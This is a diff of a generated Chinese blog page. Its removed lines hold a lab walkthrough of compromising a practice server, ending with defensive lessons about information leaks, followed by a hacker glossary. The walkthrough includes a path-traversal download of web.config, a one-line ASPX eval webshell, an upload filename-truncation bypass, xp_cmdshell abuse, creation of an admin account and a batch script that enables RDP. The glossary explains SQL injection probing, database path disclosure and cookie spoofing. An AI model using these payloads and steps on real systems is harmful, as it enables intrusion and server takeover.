-<p>从出错信息可以看到下载目录是/upfile/affix，使用../../可以到达网站根目录。一般情况下，.net网站的配置文件是web.config，尝试使用下载页面下载web.config文件：<br>构造下载链接：<a href="http://172.16.12.131:27689/admin/file_down.aspx?file=../../web.config" target="_blank" rel="noopener">http://172.16.12.131:27689/admin/file_down.aspx?file=../../web.config</a></p>
-<p><img src="/images/pasted-11.png" alt="upload successful"></p>
-<p>成功拿到当前网站的数据库用户和密码。</p>
-<p><img src="/images/pasted-12.png" alt="upload successful"><br>6、使用navicat访问数据库，拿到admin的密码（如果是md5加密，也可以手动设置新密码，将新密码的md5值存到数据库）</p>
-<p><img src="/images/pasted-13.png" alt="upload successful"></p>
-<p><img src="/images/pasted-14.png" alt="upload successful"></p>
-<p><img src="/images/pasted-15.png" alt="upload successful"><br>7、使用admin帐号和密码成功登录页面：<br><img src="/images/pasted-16.png" alt="upload successful"></p>
-<p>二、获取靶机服务器webshell权限<br>1、访问网站的各个页面，寻找有用信息。</p>
-<p><img src="/images/pasted-17.png" alt="upload successful"> </p>
-<p><img src="/images/pasted-18.png" alt="upload successful"><br>1）    系统对上传文件进行简单过滤，允许上传图像文件。<br>2）    文件名最长为32位字符，超过这一长度将进行截断</p>
-<p>2、根据上面两条信息可以上传木马从而拿到webshell权限<br>1）制作包含一句话木马的图像文件：<br>新建a.txt:<br>写入GIF89a &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“z”],”unsafe”);%&gt;<br>修改a.txt为a.jpg<br>2）上传任一超长文件名文件，发现新生成的文件名前19位是系统生成，后13位是从原文件名里截取。所以将a.jpg修改为12345678.aspx.jpg，其中前13位正好是12345678.aspx。上传12345678.aspx.jpg，最终得到后台文件637084795826686250-12345678.aspx。<br>3）使用中国菜刀连接木马：</p>
-<p><img src="/images/pasted-19.png" alt="upload successful"></p>
-<p><img src="/images/pasted-20.png" alt="upload successful"></p>
-<p>三、提权并开启远程桌面访问，获取服务器管理权限<br>1、目前只能拿到web网站的权限，权限是”network service”，无法访问管理员目录，见下图：</p>
-<p><img src="/images/pasted-21.png" alt="upload successful"></p>
-<p>2、从网站后台文件查找信息，发现bak文件里有sa用户的密码:</p>
-<p><img src="/images/pasted-22.png" alt="upload successful"></p>
-<p><img src="/images/pasted-23.png" alt="upload successful"></p>
-<p>3、使用navicat工具连接数据库</p>
-<p><img src="/images/pasted-24.png" alt="upload successful"><br>4、开启sqlserver的xp_cmdshell功能</p>
-<p><img src="/images/pasted-25.png" alt="upload successful"></p>
-<p>5、“sa”具有 管理员权限</p>
-<p><img src="/images/pasted-26.png" alt="upload successful"><br>6、新建帐号test，并转到administrators组（也可以直接net user administrator 123456强行修改administrator帐号密码）</p>
-<p><img src="/images/pasted-27.png" alt="upload successful"></p>
-<p><img src="/images/pasted-28.png" alt="upload successful"></p>
-<p><img src="/images/pasted-29.png" alt="upload successful"></p>
-<p>7、通过菜刀上传开启3389端口的.bat文件，上传到D:\web\upfile\affix\目录下：<br>3389.bat：<br>echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p>
-<p>8、开启3389端口，并关闭本机防火墙</p>
-<p><img src="/images/pasted-30.png" alt="upload successful"></p>
-<p><img src="/images/pasted-31.png" alt="upload successful"></p>
-<p>9、远程桌面连接系统，具有管理员权限，可以随意对服务器进行操作。</p>
-<p><img src="/images/pasted-32.png" alt="upload successful"></p>
-<p><img src="/images/pasted-33.png" alt="upload successful"></p>
-<p>二、第二种提权方法<br>拿到’shell’后，执行whoami，发现权限较低，尝试提权</p>
-<p><img src="/images/pasted-34.png" alt="upload successful"><br>1、首先systeminfo查看系统补丁情况，可参考如下图所示补丁对应的提权</p>
-<p><img src="/images/pasted-35.png" alt="upload successful"></p>
-<p><img src="/images/pasted-36.png" alt="upload successful"><br>2、发现可以pr提权，上传pr和cmd到可读可写目录，设置上传后的cmd的路径为终端路径（setp “上传后的路径地址”）</p>
-<p><img src="/images/pasted-37.png" alt="upload successful"><br>3、发现pr可以执行whoami，但无法执行net user（提示拒绝访问，说明net命令无权限），上传net到pr工具同一目录下就可以执行了</p>
-<p><img src="/images/pasted-38.png" alt="upload successful"></p>
-<p><img src="/images/pasted-39.png" alt="upload successful"></p>
-<p>4、到这提权基本结束了，拿到system权限，修改administrator的密码，开3389登录拿到’key’</p>
-<p><img src="/images/pasted-40.png" alt="upload successful"></p>
-<p><img src="/images/pasted-41.png" alt="upload successful"><br>至此，拿到了服务器的最高权限。对这个过程进行回顾，发现信息泄漏起到了很关键的作用，而这些泄漏方式在实际研发过程中是普遍存在的，比如在robots.txt文件里泄漏了后台页面的名字，比如将备份的配置文件.bak保留在原地，比如提示提示文件名截断的说明信息等等。<br>如果说应用系统本身存在的上传下载等漏洞是技术（能力）上的硬伤，那这些信息泄漏就是工作习惯（态度）上的软伤。安全加固，需要从技术和开发习惯两方面共同下功夫，两手抓两手都要硬。</p>
-
+          <p>仅知道靶机的ip是172.16.12.131，现在需要一步步去获取更多的信息。</p><p>一、获取靶机的登录权限：<br>1、探测靶机开放端口：</p><p><img src="/images/pasted-4.png" alt="upload successful"><br>发现1433端口开放。1433对应mssqlserver数据库服务。</p><p>2、继续探测非默认服务端口，发现27689端口对外开放</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>3、尝试用浏览器访问，发现是web服务端口，打开网页如下：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/18/%E6%A1%88%E4%BE%8B%E4%B8%80%E6%8F%90%E6%9D%83/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1804,67 +1071,15 @@ exploit-db/wooyun/
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>1.肉鸡：<br>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，对方可以是WINDOWS系统，也可以是UNIX/LINUX系统，可以是普通的个人电脑，也可以是大型的服务器，我们可以象操作自己的电脑那样来操作它们，而不被对方所发觉。</p>
-<p>2.木马：<br>就是那些表面上伪装成了正常的程序，但是当这些被程序运行时，就会获取系统的整个控制权限。有很多黑客就是热中与使用木马程序来控制别人的电脑，比如灰鸽子，黑洞，PcShare等等。</p>
-<p>3.网页木马：<br>表面上伪装成普通的网页文件或是将而已的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。</p>
-<p>4.挂马：<br>就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。</p>
-<p>5.后门：<br>这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。这些改动表面上是很难被察觉的，但是入侵者却可以使用相应的程序或者方法来轻易的与这台电脑建立连接，重新控制这台电脑，就好象是入侵者偷偷的配了一把主人房间的要是，可以随时进出而不被主人发现一样。 通常大多数的特洛伊木马（Trojan Horse）程序都可以被入侵者用语制作后门（BackDoor）</p>
-<p>6.rootkit：<br>rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过，对方系统内存在的安全漏洞获得系统的root权限。然后，攻击者就会在对方的系统中安装rootkit，以达到自己长久控制对方的目的，rootkit与我们前边提到的木马和后门很类似，但远比它们要隐蔽，黑客守卫者就是很典型的rootkit，还有国内的ntroorkit等都是不错的rootkit工具。</p>
-<p>7.IPC$：<br>是共享“命名管道”的资源，它是为了让进程间通信而开放的饿命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计<br>算机和查看计算机的共享资源时使用。</p>
-<p>8.弱口令：<br>指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）</p>
-<p>9.默认共享：<br>默认共享是WINDOWS2000/XP/2003系统开启共享服务时自动开启所有硬盘的共享，因为加了”$”符号，所以看不到共享的托手图表，也成为隐藏共享。</p>
-<p>10.shell：<br>指的是一种命令指行环境，比如我们按下键盘上的“开始键+R”时出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这个就是WINDOWS的Shell执行环境。通常我们使用远程溢出程序成功溢出远程电脑后得到的那个用于执行系统命令的环境就是对方的shell</p>
-<p>11.WebShell：<br>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门。黑客在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，好后就可以使用浏览器来访问这些asp 或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。可以上传下载文件，查看数据库，执行任意程序命令等。国内常用的WebShell有海阳ASP木马，Phpspy，c99shell等</p>
-<p>12.溢出：<br>确切的讲，应该是“缓冲区溢出”。简单的解释就是程序对接受的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。大致可以分为两类：（1）堆溢出；（2）栈溢出。</p>
-<p>13.注入：<br>随着B/S模式应用开发的发展，使用这种模式编写程序的程序员越来越来越多，但是由于程序员的水平参差不齐相当大一部分应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想要知的数据，这个就是所谓的SQLinjection，即：SQL注入。</p>
-<p>14.注入点：<br>是可以实行注入的地方，通常是一个访问数据库的连接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。</p>
-<p>15.内网：<br>通俗的讲就是局域网，比如网吧，校园网，公司内部网等都属于此类。查看IP地址如果是在以下三个范围之内的话，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</p>
-<p>16.外网：<br>直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问，IP地址不是保留IP（内网）IP地址。</p>
-<p>17.端口：<br>（Port）相当于一种数据的传输通道。用于接受某些数据，然后传输给相应的服务，而电脑将这些数据处理后，再将相应的恢复通过开启的端口传给对方。一般每一个端口的开放的偶对应了相应的服务，要关闭这些端口只需要将对应的服务关闭就可以了。</p>
-<ol start="18">
-<li>3389、4899肉鸡：<br>3389是Windows终端服务（Terminal Services）所默认使用的端口号，该服务是微软为了方便网络管理员远程管理及维护服务器而推出的，网络管理员可以使用远程桌面连接到网络上任意一台开启了终端服务的计算机上，成功登陆后就会象操作自己的电脑一样来操作主机了。这和远程控制软件甚至是木马程序实现的功能很相似，终端服务的连接非常稳定，而且任何杀毒软件都不会查杀，所以也深受黑客喜爱。黑客在入侵了一台主机后，通常都会想办法先添加一个属于自己的后门帐号，然后再开启对方的终端服务，这样，自己就随时可以使用终端服务来控制对方了，这样的主机，通常就会被叫做3389肉鸡。Radmin是一款非常优秀的远程控制软件，4899就是Radmin默认使用也经常被黑客当作木马来使用（正是这个原因，目前的杀毒软件也对Radmin查杀了）。有的人在使用的服务端口号。因为Radmin的控制功能非常强大，传输速度也比大多数木马快，而且又不被杀毒软件所查杀，所用Radmin管理远程电脑时使用的是空口令或者是弱口令，黑客就可以使用一些软件扫描网络上存在Radmin空口令或者弱口令的主机，然后就可以登陆上去远程控制对恶劣，这样被控制的主机通常就被成做4899肉鸡。</li>
-</ol>
-<p>19.免杀：<br>就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</p>
-<p>20.加壳：<br>就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</p>
-<p>21.花指令：<br>就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是”杀毒软件是从头到脚按顺序来查找病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。</p>
-<p>22.什么是TCP/IP<br>是一种网络通信协议，他规范了网络上所有的通信设备，尤其是一个主机与另一个主机之间的数据往来格式以及传送方式.，TCP/IP是INTERNET的基础协议，也是一种电脑数据打包和寻址的标准方法.在数据传诵中，可以形象地理解为两个信封，TCP和IP就像是信封，要传递的信息被划为若干段，<br>每一段塞入一个TCP信封，并在该信封面上记录有分段号的信息，再将TCP信封塞入IP大信封，发送上网.</p>
-<p>23.什么是路由器<br>路由器应该是在网络上使用最高的设备之一了，它的主要作用就是路由选路，将IP数据包正确的送到目的地，因此也叫IP路由器.</p>
-<p>24.什么是蜜罐<br>好比是情报收集系统.蜜罐好象是故意让人攻击的目标，引诱黑客来攻击，所有攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对你的服<br>务器发动的最新的攻击和漏洞.还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络.</p>
-<p>25.什么是拒绝服务攻击<br>DOS是DENIALOFSERVICE的简称，即拒绝服务，造成DOS的攻击行为被称为DOS攻击，其目的是使计算机或网络无法正常服务，最常见的DOS攻击有计算机网络宽带攻击和连通性攻击，连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源被消耗，最终计算机无法再处理合法用户的请求.</p>
-<p>26.什么是脚本注入攻击(SQLINJECTION)<br>所谓脚本注入攻击者把SQL命令插入到WEB表单的输入域或也面请求的查学字符串，欺骗服务器执行恶意的SQL命令，在某些表单中，用户输入的内容直接用来构造动态的SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击.</p>
-<p>27.什么是防火墙?它是如何确保网络安全的<br>使用防火墙（Firewall）是一种确保网络安全的方法。防火墙是指设置在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间的一系列部件的组合。它是不同网络或网络安全域之间信息的惟一出入口，能根据企业的安全政策控制（允许、拒绝、监测）出入网络的信息流，且本身具有较强的抗攻击能力。它是提供信息安全服务，实现网络和信息安全的基础设施。</p>
-<p>28.什么是后门?为什么会存在后门？<br>后门（BackDoor）是指一种绕过安全性控制而获取对程序或系统访问权的方法。在软件的开发阶段，程序员常会在软件内创建后门以便可以修改程序中的缺陷。如果后门被其他人知道，或是在软件之前没有删除，那么它就成了安全隐患。</p>
-<p>29.什么叫入侵检测<br>入侵检测是防火墙的合理补充，帮助系统对付网络攻击，扩展系统管理员的安全管理能力（包括安全审计、监视、进攻识别和响应），提高信息安全基础结构的完整性。它从计算机网络系统中的若干关键点收集信息，并分析这些信息，检查网络中是否有违反安全策略的行为和遭到袭击的迹象</p>
-<p>30.什么叫数据包监测，它有什么作用<br>数据包监测可以被认为是一根窃听电话线在计算机网络中的等价物。当某人在“监听”网络时，他们实际上是在阅读和解释网络上传送的数据包。如果你需要在互联网上通过计算机发送一封电子邮件或请求下载一个网页，这些操作都会使数据通过你和数据目的地之间的许多计算机。这些传输信息时经过的计算机都能够看到你发送的数据，而数据包监测工具就允许某人截获数据并且查看它。在这里值得一题的是，美国的落山基级骇动力潜艇就有几艘专们用于海底电缆的数据监听。特别是太平洋。</p>
-<p>31.什么是NIDS<br>NIDS是NetworkIntrusionDetectionSystem的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker<br>通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一<br>种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</p>
-<p>32.什么叫SYN包<br>TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去实际不存在的<br>站点，因此无法有效进行处理。</p>
-<p>33.加密技术是指什么<br>加密技术是最常用的安全保密手段，利用技术手段把重要的数据变为乱码（加密）传送，到达目的地后再<br>用相同或不同的手段还原（解密）。<br>加密技术包括两个元素：算法和密钥。算法是将普通的信息或者可以理解的信息与一串数字（密钥）结合<br>，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解密的一种算法。在安全保密中，可通过适当的<br>钥加密技术和管理机制来保证网络的信息通信安全。</p>
-<p>34.局域网内部的ARP攻击是指什么<br>ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。<br>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当<br>前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。一般<br>情况下，受到ARP攻击的计算机会出现两种现象:<br>1.不断弹出“本机的XXX段硬件地址与网络中的XXX段地址冲突”的对话框。<br>2.计算机不能正常上网，出现网络中断的症状。<br>因为这种攻击是利用ARP请求报文进行“欺骗”的，所以防火墙会误以为是正常的请求数据包，不予拦截<br>。因此普通的防火墙很难抵挡这种攻击。</p>
-<p>35.什么叫欺骗攻击?它有哪些攻击方式<br>网络欺骗的技术主要有:HONEYPOT和分布式HONEYPOT、欺骗空间技术等。主要方式有:IP欺骗、ARP欺骗、<br>DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送<br>假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。<br>嗅探<br>计算机网络的共享通讯道的，支持每对通讯计算机独占通道的交换机/集线器仍然过于昂贵，共享意为着<br>计算机能够接收到发送给其他计算机的信息，捕获在网络中传输的数据信息就称为嗅探.</p>
-<p>36.木马<br>全称为特洛伊木马(TrojanHorse)，是根据希腊神话传说中一次战争而得名。麦尼劳斯派兵讨伐特洛伊国<br>王，他们假装打败，然后留下一个大木马，而木马里却藏着最强悍的勇士！最后等晚上时间一到，木马里的勇<br>士就冲出来把敌人打败了。这就是后来的”木马计”，而黑客中的木马有点后门的意思，就是把预谋的功能隐<br>藏在公开的功能里，掩饰真正的企图。</p>
-<p>37.肉鸡<br>已经被攻击了，对其具有控制权的主机。</p>
-<p>38.跳板<br>一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。</p>
-<p>39.弱口令<br>所谓弱口令也就是指密码与用户名相同，密码为空的用户名与密码组合，也包括那些密码强度不够，容易<br>被猜解的组合，一般专业认识不会犯这种错误。</p>
-<p>40.权限<br>计算机用户对于文件及目录的建立，修改，删除以及对于某些服务的访问，程序的执行，是以权限的形式<br>来严格区分的.被赋予了相应的权限，就可以进行相应的操作，否则就不可以.</p>
-<p>41.溢出<br>程序在处理我们提交给它的数据时，有的时候忘了检查数据的大小与合法性，那么这些数据可能会超过属<br>于自己的地盘，覆盖到其它数据的盘.如果这些超长数据被精心的策划构造的话，可能会被黑客去执行任意命令<br>.打个比喻来说，windows系统是一个人，会一杯一杯喝我们给它准备的水，其中有一个杯子太小了，我们倒入<br>了大量的水它就会溢出到别的杯子里去，而溢出到别的杯子里的东西我们事先可以设计好，而系统并不知道，<br>这以为这本来就是那个杯子里的东西，于是我们可以完成一定的任务.</p>
-<p>42.端口<br>要网络上，知道一台电脑的ip地址，只是相当于知道了它的居住地址，要和它进行通信，我们还要知道它<br>开了哪些端口，比如说我们到一家医院，挂号要到1号窗口，划价要到2号窗口，取药要到3号窗口.那么与计算<br>机的通信也是一样的，要上qq，你得登陆到腾讯服务器的8000端口，要浏览x档案的论坛，你得与其80端口进行<br>联系，要ftp登陆空间，传输文件，我们又得服务器的21端口连接了.可以说，端口就是一种数据的传输通道，<br>用于接收某些数据，然后传给相应的服务，而电脑将这些数据处理后，再将相应的回复通过端口传给对方.</p>
-<p>43.ip地址<br>inter上的电脑有许多，为了让他们能够相互识别，inter上的每一台主机都分配有一个唯一的32位地址，该地址称为ip地址，也称作网际地址，ip地址由4个数值部分组成，每个数值部分可取值0-255，各部分之间用一个‘.‘分开.<br>ARP<br>地址解析协议(AddressResolutionProtocol)<br>此协议将网络地址映射到硬件地址。<br>RARP<br>反向地址解析协议(ReverseAddressResolutionProtocol)<br>此协议将硬件地址映射到网络地址<br>UDP<br>用户数据报协议(UserDatagramProtocol)<br>这是提供给用户进程的无连接协议，用于传送数据而不执行正确性检查。<br>FTP<br>文件传输协议(FileTransferProtocol)<br>允许用户以文件操作的方式（文件的增、删、改、查、传送等）与另一主机相互通信。<br>SMTP<br>简单邮件传送协议(SimpleMailTransferProtocol)<br>SMTP协议为系统之间传送电子邮件。<br>TELNET<br>终端协议(TelTerminalProcotol)<br>允许用户以虚终端方式访问远程主机<br>HTTP<br>超文本传输协议(HypertextTransferProcotol)<br>TFTP<br>简单文件传输协议(TrivialFileTransferProtocol)<br>Shell<br>Shell就是系统于用户的交换式界面。简单来说，就是系统与用户的一个沟通环境，我们平时用到的DOS就是一个Shell(Win2K或cmd.exe)。<br>Root<br>Unix里最高权限的用户，也就是超级管理员。<br>Admin<br>WindowsNT/2K/XP里最高权限的用户，也就是超级管理员。<br>Rootshell<br>通过一个溢出程序，在主机溢出一个具有Root权限的Shell。<br>Exploit<br>溢出程序。Exploit里通常包含一些Shellcode。<br>Shellcode<br>溢出攻击要调用的函数，溢出后要一个交换式界面进行操作。所以说就有了Shellcode。<br>AccesControllist(ACL)<br>访问控制列表。<br>AddressResolutionProtocol(ARP)<br>地址解析协议。<br>Administratoraccount<br>管理员帐号。<br>ARPANET<br>阿帕网(Inter的简称)。<br>accesstoken<br>访问令牌。<br>adaptivespeedleveling<br>自适应速度等级调整。<br>algorithm<br>算法alias别名。<br>anlpasswd<br>一种与PASSWD+相似的代理密码检查器。<br>applicatlons<br>应用程序异步传递模式。<br>accoutlockout<br>帐号封锁。<br>accoutpolicies<br>记帐策略。<br>accounts<br>帐号。<br>adapter<br>适配器。</p>
-<p>44.上传漏洞<br>这个漏洞在DVBBS6.0时代被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。<br>怎样利用：在网站的地址栏中网址后加上/upfile.asp如果显示“上传格式不正确[重新上传]”这样的字样就是有上传漏洞了，找个可以上传的工具<br>直接可以得到WEBSHELL。<br>工具介绍：上传工具，老兵的上传工具、DOMAIN3.5，这两个软件都可以达到上传的目的，用NC也可以提交。</p>
-<p>45.WEBSHELL是什么:<br>其实WEBSHELL并不什么深奥的东西，是个WEB的权限，可以管理WEB，修改主页内容等权限，但是并没有什么特别高的权限，(这个看管理员的设置了)一般修改别人主页大多都需要这个权限，接触过WEB木马的朋友可能知道（比如老兵的站长助手就是WEB木马，海阳2006也是WEB木马）。我们上传漏洞最终传的就是这个东西，有时碰到权限设置不好的服务器可以通过WEBSHELL得到最高权限。</p>
-<p>46.暴库<br>这个漏洞现在很少见了，但是还有许多站点有这个漏洞可以利用，暴库就是提交字符得到数据库文件，得到了数据库文件我们就直接有了站点的前台或者后台的权限了。</p>
-<p>暴库方法：<br>     比如一个站的地址为<a href="http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161，我门就可以把com/dispbbs中间的/换成\，如果有漏洞直接得到数据库的绝对路径，用寻雷什么的下载下来就可以了。" target="_blank" rel="noopener">http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161，我门就可以把com/dispbbs中间的/换成\，如果有漏洞直接得到数据库的绝对路径，用寻雷什么的下载下来就可以了。</a><br>     还有种方法就是利用默认的数据库路径<a href="http://www.xxx.com/后面加上conn.asp。如果没有修改默认的数据库路径也可以得到数据库的路径（注意：这里的/也要换成\）。" target="_blank" rel="noopener">http://www.xxx.com/后面加上conn.asp。如果没有修改默认的数据库路径也可以得到数据库的路径（注意：这里的/也要换成\）。</a><br>     为什么换成\：因为在ASCII码里/等于\，有时碰到数据库名字为/#abc.mdb的为什么下不了?这里需要把#号换成#就可以下载了，为什么我暴出的数据库文件是以.ASP结尾的?我该怎么办?这里可以在下载时把.ASP换成.MDB这样就可以下载了如果还下载不了可能作了防下载。</p>
-<p>47.注入漏洞<br>这个漏洞是现在应用最广泛，杀伤力也很大的漏洞，可以说微软的官方网站也存在着注入漏洞。注入漏洞是因为字符过滤不严禁所造成的，可以得到管理员的帐号密码等相关资料。<br> 怎样利用：<br>我先介绍下怎样找漏洞比如这个网址<a href="http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161后面是以ID=数字形式结尾的站我们可以手动在后面加上个and1=1看看" target="_blank" rel="noopener">http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161后面是以ID=数字形式结尾的站我们可以手动在后面加上个and1=1看看</a><br>如果显示正常页面再加上个and1=2来看看如果返回正常页面说明没有漏洞如果返回错误页面说明存在注入漏洞。如果加and1=1返回错误页面说明也没有漏洞，知道了站点有没有漏洞我们就可以利用手工来猜解也可以用工具现在工具比较多（NBSI、NDSI、啊D、DOMAIN等），都可以用来猜解帐号密码，因为是菜鸟接触，我还是建议大家用工具，手工比较烦琐。</p>
-<p>48.旁注<br>我们入侵某站时可能这个站坚固的无懈可击，我们可以找下和这个站同一服务器的站点，然后在利用这个站点用提权，嗅探等方法来入侵我们要入侵的站点。<br>打个形象的比喻，比如你和我一个楼，我家很安全，而你家呢，却漏洞百出，现在有个贼想入侵我家，他对我家做了监视（也就是扫描），发现没有什么可以利用的东西，那么这个贼发现你家和我家一个楼，你家很容易就进去了，他可以先进入你家，然后通过你家得到整个楼的钥匙（系统权限），这样就自然得到我的钥匙了，就可以进入我的家（网站）。</p>
-<p>工具介绍：<br>还是名小子的DOMIAN3.5不错的东西，可以检测注入，可以旁注，还可以上传!</p>
-<p>49.COOKIE诈骗<br>许多人不知道什么是COOKIE，COOKIE是你上网时由网站所为你发送的值记录了你的一些资料，比如IP，姓名什么的。<br>怎样诈骗呢？如果我们现在已经知道了XX站管理员的站号和MD5密码了，但是破解不出来密码（MD5是加密后的一个16位的密码）。我们就可以用<br>COOKIE诈骗来实现，把自己的ID修改成管理员的，MD5密码也修改成他的，有工具可以修改COOKIE这样就答到了COOKIE诈骗的目的，系统以为你就是管理员了。</p>
-<p>50.防火墙系统：<br>IDS入侵检测——现在一般有成品软件卖</p>
-<p>51.时间戳<br>  “时间戳”是个听起来有些玄乎但实际上相当通俗易懂的名词，我们查看系统中的文件属性，其中显示的创建、修改、访问时间就是该文件的时间戳。<br>    对于大多数一般用户而言，通过修改“时间戳”也许只是为了方便管理文件等原因而掩饰文件操作记录。但对于应用数字时间戳技术的用户就并非这么“简单”了，这里的“时间戳”（time-stamp）是一个经加密后形成的凭证文档，是数字签名技术的一种变种应用。<br>     在电子商务交易文件中，利用数字时间戳服务（DTS：digita1timestampservice）能够对提供电子文件的日期和时间信息进行安全保护，以防止被商业对手等有不良企图的人伪造和串改的关键性内容。</p>
-<p>52.MySQL数据库<br>     我们在黑客文章中常会看到针对“MySQL数据库”的攻击，但很多朋友却对其不大了解。“MySQL数据库”之所以应用范围如此广泛，是由于它是一款免费的开放源代码的多用户、多线程的跨平台关系型数据库系统，也可称得上是目前运行速度最快的SQL语言数据库。</p>
-<p>   “MySQL数据库”提供了面向C、C++、Java等编程语言的编程接口，尤其是它与PHP的组合更是黄金搭档。“MySQL数据库”采用的是客户机/服务器结构的形式，它由一个服务器守护程序Mysqld和很多不同的客户程序和库组成。但若是配置不当，“MySQL数据库”就可能会受到攻击，例如若是设置本地用户拥有对库文件读权限，那么入侵者只要获取“MySQL数据库”的目录，将其复制本机数据目录下就能访问进而窃取数据库内容。</p>
-<p>53.MD5验证<br>MD5（全称是message-digestalgorithm5）的作用是让大容量信息在用数字签名软件签署私人密匙前被“压缩”为一种保密的格式。它的典型应用是对一段信息（message）产生信息摘要（message-digest），以防止被篡改。通俗地说MD5码就是个验证码，就像我们的个人身份证一样，每个人的都是不一样的。MD5码是每个文件的唯一校验码（MD5不区分大小写，但由于MD5码有128位之多，所以任意信息之间具有相同MD5码的可能性非常之低，通常被认为是不可能的），凭借此特性常被用于密码的加密存储、数字签名及文件完整性验证等功能。通过MD5验证即可检查文件的正确性，例如可以校验出下载文件中是否被捆绑有其它第三方软件或木马、后门（若是校验结果不正确就说明原文件已被人擅自串改）。</p>
-<p>54.ICMP协议<br>ICMP（全称是InterControlMessageProtocol，即Inter控制消息协议）用于在IP主机、路由器之间传递控制消息，包括网络通不通、主机是否可达、路由是否可用等网络本身的消息。例如，我们在检测网络通不通时常会使用Ping命令，Ping执行操作的过程就是ICMP协议工作的过程。“ICMP协议”对于网络安全有着极其重要的意义，其本身的特性决定了它非常容易被用于攻击网络上的路由器和主机。例如，曾经轰动一时的海信主页被黑事件就是以ICMP攻击为主的。由于操作系统规定ICMP数据包最大尺寸不超过64KB，因而如果向目标主机发送超过64KB上限的数据包，该主机就会出现内存分配错误，进而导致系统耗费大量的资源处理，疲于奔命，最终瘫痪、死机。</p>
